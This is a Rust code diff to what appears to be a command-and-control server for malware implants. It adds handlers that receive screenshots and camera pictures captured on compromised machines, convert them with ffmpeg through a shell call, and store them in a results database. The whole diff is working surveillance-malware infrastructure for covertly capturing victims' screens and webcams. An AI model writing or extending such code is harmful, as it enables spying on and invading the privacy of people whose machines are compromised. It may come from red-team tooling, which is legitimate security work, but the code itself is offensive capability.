@@ -3,6 +3,8 @@ use arrayvec::ArrayVec;
 use base64;
 use chrono;
 use diesel::prelude::*;
+use std::fs::File;
+use std::io::Write;
 use std::str::FromStr;
 use uuid;
 use x25519_dalek::{PublicKey, StaticSecret};
@@ -12,7 +14,7 @@ use crate::errors::ServerError;
 use crate::models::implant::{Implant, SystemInfo};
 use crate::models::plain_result::PlainResult;
 use crate::models::task::{Task, Tasks};
-use crate::utils::network_encryption;
+use crate::utils::{network_encryption, shell};
 
 #[post("/api/result/{task_id}")]
 pub async fn post_task(
@@ -88,13 +90,57 @@ pub async fn post_task(
             let deserialized_response: Vec<u8> = bincode::deserialize(&decrypted_response[..])?;
 
             // Save in plain_results table
-            web::block(move || add_plain_result(db, task.task_id, deserialized_response)).await??;
+            web::block(move || add_plain_result(db, task.task_id, deserialized_response, None))
+                .await??;
         }
         Tasks::ChangeCheckIn => {
             let deserialized_response: Vec<u8> = bincode::deserialize(&decrypted_response[..])?;
 
             // Save in plain_results table
-            web::block(move || add_plain_result(db, task.task_id, deserialized_response)).await??;
+            web::block(move || add_plain_result(db, task.task_id, deserialized_response, None))
+                .await??;
+        }
+        Tasks::TakeScreenshot => {
+            let deserialized_response: Vec<u8> = bincode::deserialize(&decrypted_response[..])?;
+
+            // Save bytes as task_id.yuv
+            let mut file = File::create(format!("assets/{}.yuv", task.task_id.to_string()))?;
+            file.write_all(&deserialized_response)?;
+
+            // Save image as png
+            shell::execute_command(format!("ffmpeg -s 640x480 -pix_fmt yuyv422 -i assets/{}.yuv -f image2 -pix_fmt rgb24 assets/{}.png", task.task_id.to_string(), task.task_id.to_string()))?;
+
+            // Save in plain_results table
+            web::block(move || {
+                add_plain_result(
+                    db,
+                    task.task_id,
+                    deserialized_response,
+                    Some(format!("{}.png", task.task_id.to_string())),
+                )
+            })
+            .await??;
+        }
+        Tasks::TakePicture => {
+            let deserialized_response: Vec<u8> = bincode::deserialize(&decrypted_response[..])?;
+
+            // Save bytes as task_id.yuv
+            let mut file = File::create(format!("assets/{}.yuv", task.task_id.to_string()))?;
+            file.write_all(&deserialized_response)?;
+
+            // Save image as png
+            shell::execute_command(format!("ffmpeg -s 640x480 -pix_fmt yuyv422 -i assets/{}.yuv -f image2 -pix_fmt rgb24 assets/{}.png", task.task_id.to_string(), task.task_id.to_string()))?;
+
+            // Save in plain_results table
+            web::block(move || {
+                add_plain_result(
+                    db,
+                    task.task_id,
+                    deserialized_response,
+                    Some(format!("{}.png", task.task_id.to_string())),
+                )
+            })
+            .await??;
         }
         _ => unimplemented!(),
     }
@@ -265,12 +311,13 @@ fn add_plain_result(
     db: web::Data<Pool>,
     task_id: uuid::Uuid,
     deserialized_response: Vec<u8>,
+    image_url: Option<String>,
 ) -> Result<(), ServerError> {
     use crate::schema::plain_results::dsl::plain_results;
 
     let conn = db.get()?;
 
-    let plain_result = PlainResult::new(deserialized_response, task_id);
+    let plain_result = PlainResult::new(deserialized_response, image_url, task_id);
 
     diesel::dsl::insert_into(plain_results)
         .values(&plain_result)
